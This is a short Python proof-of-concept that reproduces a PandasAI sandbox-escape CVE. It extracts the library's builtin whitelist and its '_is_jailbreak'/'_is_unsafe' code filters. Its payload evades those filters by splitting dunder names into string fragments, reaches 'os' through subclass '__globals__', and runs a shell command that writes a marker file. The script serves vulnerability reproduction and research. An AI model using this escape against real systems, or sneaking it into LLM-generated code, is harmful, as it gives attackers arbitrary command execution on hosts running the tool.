# REPRODUCTION of CVE-2024-12366 (PandasAI <=2.4.3 sandbox escape). Not a novel finding.
# See ANALYSIS.md. Non-destructive: writes only a local marker file to prove command execution.
import ast, os, sys, glob
SRC=sys.argv[1]
import pandas as pd, numpy as np, matplotlib.pyplot as plt, astor

# --- authentic sandbox pieces from pandasai 2.3.2 source ---
consts=open(os.path.join(SRC,"constants.py")).read()
for n in ast.parse(consts).body:
    if isinstance(n,ast.Assign) and any(getattr(t,'id',None)=="WHITELISTED_BUILTINS" for t in n.targets):
        WB=ast.literal_eval(n.value)
bi=__builtins__ if isinstance(__builtins__,dict) else __builtins__.__dict__
def get_environment():   # verbatim logic of helpers/optional.py get_environment([])
    env={"pd":pd,"plt":plt,"np":np}
    env["__builtins__"]={**{b:bi[b] for b in WB},"__build_class__":__build_class__,"__name__":"__main__"}
    return env
cc=open(os.path.join(SRC,"pipelines/chat/code_cleaning.py")).read()
F={}
for cls in ast.parse(cc).body:
    if isinstance(cls,ast.ClassDef):
        for f in cls.body:
            if isinstance(f,ast.FunctionDef) and f.name in ("_is_jailbreak","_is_unsafe"):
                g={"ast":ast,"astor":astor}; exec(astor.to_source(ast.Module(body=[f],type_ignores=[])),g); F[f.name]=g[f.name]
class D: pass
d=D()
def clean_ok(code):   # mimic _clean_code node filtering
    for node in ast.parse(code).body:
        if isinstance(node,(ast.Import,ast.ImportFrom)): return False,"import blocked"
        if F["_is_jailbreak"](d,node): return False,"_is_jailbreak"
        if F["_is_unsafe"](d,node): return False,"_is_unsafe"
    return True,"passes pandasai _clean_code filters"

MARK="/tmp/claude-0/-home-user-Driver/cb67830d-44ca-5780-97ec-3a598d1f25c4/scratchpad/RCE_PROOF"
for f in glob.glob(MARK+"*"): os.remove(f)

# attacker-controlled (LLM-generated) code — pure sandbox escape, no blocked tokens
payload = (
'b = ().__class__.__base__\n'
'subs = getattr(b, "__subcla" + "sses__")()\n'
'for c in subs:\n'
'    gl = getattr(getattr(c, "__init__", None), "__glob" + "als__", None)\n'
'    if gl and "os" in gl:\n'
'        gl["os"].system("id > %s; echo PWNED_BY_PANDASAI > %s")\n'
'        break\n' % (MARK, MARK)
)
print("PAYLOAD:\n"+payload)
ok,why=clean_ok(payload); print("FILTER RESULT:",why)
if ok:
    env=get_environment()
    exec(payload, env)        # exactly pandasai's exec(code, env)
print("\n=== PROOF ===")
for f in sorted(glob.glob(MARK+"*")):
    print("file:",f); print("contents:",open(f).read().strip())
